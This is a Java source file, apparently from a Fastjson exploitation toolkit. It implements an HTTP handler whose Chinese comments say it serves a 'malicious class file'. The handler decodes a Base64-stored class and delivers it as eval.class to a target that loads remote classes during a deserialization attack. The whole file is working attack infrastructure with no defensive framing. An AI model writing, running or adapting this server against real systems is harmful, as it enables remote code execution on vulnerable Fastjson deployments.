package com.fastjsontool.exploit.httpServer;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;

/**
 * 创建一个简易的http服务器用于返回恶意类文件
 */
public class HTTPHandle implements HttpHandler {
    private String ClassContenxt;  //存储恶意类文件内容
    @Override
    public void handle(HttpExchange httpExchange) {
        try {
            handleResponse(httpExchange);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void setClassContenxt(String classContenxt) {
        ClassContenxt = classContenxt;
    }

    /**
     * 处理响应
     * @param httpExchange
     * @throws Exception
     */
    private void handleResponse(HttpExchange httpExchange) throws Exception {
        //将此处换成返回
        //生成html
        byte[] decode = Base64.getDecoder().decode(this.ClassContenxt);

        //设置响应头，必须在sendResponseHeaders方法之前设置！
        httpExchange.getResponseHeaders().add("Content-Type","application/octet-stream");
        httpExchange.getResponseHeaders().add("Content-Disposition:", "attachment;filename=eval.class");

        //设置响应码和响应体长度，必须在getResponseBody方法之前调用！
        httpExchange.sendResponseHeaders(200, decode.length);

        OutputStream out = httpExchange.getResponseBody();
        out.write(decode);
        out.flush();
        out.close();
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//设置日期格式
        System.out.println("HTTP服务器成功接收请求,时间："+df.format(new Date()));
    }
}
